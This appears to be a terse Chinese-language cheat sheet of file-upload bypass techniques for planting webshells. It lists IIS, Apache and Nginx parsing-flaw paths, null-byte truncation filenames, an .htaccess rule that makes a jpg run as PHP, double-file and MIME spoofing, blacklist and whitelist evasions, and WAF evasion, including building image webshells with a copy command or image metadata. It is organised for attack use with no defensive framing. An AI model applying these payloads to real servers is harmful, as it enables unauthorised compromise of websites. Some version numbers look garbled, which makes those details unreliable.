·系统
	1.windows
		ntfs流：a.asp.、a.asp_、a.asp空格、a.asp.空格.
	2.linux：
		linux+apache：.asp.、.php.   




·解析漏洞
	1.iis
		iis5.0-6.0：/x.asp/meinv.jpg     图片马解析
		iis5.0-6.0：x.asp;.jpg	
		iis5.0-6.0：x.asp、x.asa、x.cer、x.cdx、x.asax
		IIS 7.0-7.5(前提：开FastCGI)：/upload/x.jpg/.php      图片马解析【菜刀连接：/upload/x.jpg/.php】
		IIS 7.0-7.5：x.ashx(.net)、x.cer、x.asa

	2.apache
		apache通用：x.php.xxx.zzz
		apache通用：asp/asa/php/php3/php4/phtml/
		apache通用(linux、unix，前提：①php开CGI/FastCGI；②mod_rewrite开启；③AllowOverride All)：<FilesMatch "shell.jpg"> ForceType application/x-httpd-php  SetHandler application/x-httpd-php </FilesMatch>

	3.nginx
		Nginx <8.03(前提：开FastCGI)：/upload/x.jpg/.php
		Nginx <8.037(前提：关FastCGI)：a.php%00.jpg
		Nginx 0.8.41 – 1.5.6：webshell.jpg \0.php【webshell.jpg+“空格”+“\0”+“.php”   】
		Nginx 目录跨越：www.abc.com/files../  访问根目录【/files/是linux的目录，配置写成“/files”就成了漏洞了】

·代码：	
	1.js：
		抓包：burp
		前端：javascript

	2.截断（前提：php<7）：
		xxx.jpg%00.php
		ooo.php%00.jpg

	3.二次上传：
		burp  intruder  *  n次

	4.双文件：
		<input id="file" name="file" type="file">//原有的
		<input id="file2" name="file" type="file">//新增的一行

	5.mime：
		Content-Type : image/jpeg

	6.渲染：
		对比渲染前后。。。有的话才行。。

	7.包含：
		包含xx.jpg即可


·黑白名单：
	验证：123.asdhajsfhkja
	1.黑名单：
		①大小写：123.Php
		②锜型绕过：123.cer、123.phtml
		③截断（前提：php<7）：xxx.jpg00%.php、ooo.php%00.jpg
		④解析漏洞：x.asp;.jpg。。。。。
		⑤系统漏洞：x.asp_   之前碰到过一个系统漏洞的
		⑥.htacess

	2.白名单：
		①xx.asp%00.jpg、xx.jpg00%.asp
		②.htacess
		③解析漏洞：x.asp;.jpg、xx.jpg/.php
		④系统漏洞：x.asp_   之前碰到过一个系统漏洞的
		⑤二次上传
		⑥require_once(前提：得存在这种解析)：id=xx.jpg
		⑦双文件
·编辑器：
	略



·waf：
	通用：分块上传
	1.检测特征：我不会。。
	2.检测文件相关信息（如：内容检测）：伪造文件头，加入一些正常的数据
	3.制作免杀图片马：
		①copy：
			copy 1.jpg/b+1.asp/a 2.jpg    制作2.jpg图片马

		②C32Asm
			略

		③phpotoshop
			打开图片
			文件-》文件简介，插webshell
			文件->保存

		④图片属性写webshell
			https://www.cnblogs.com/xdans/p/5412563.html
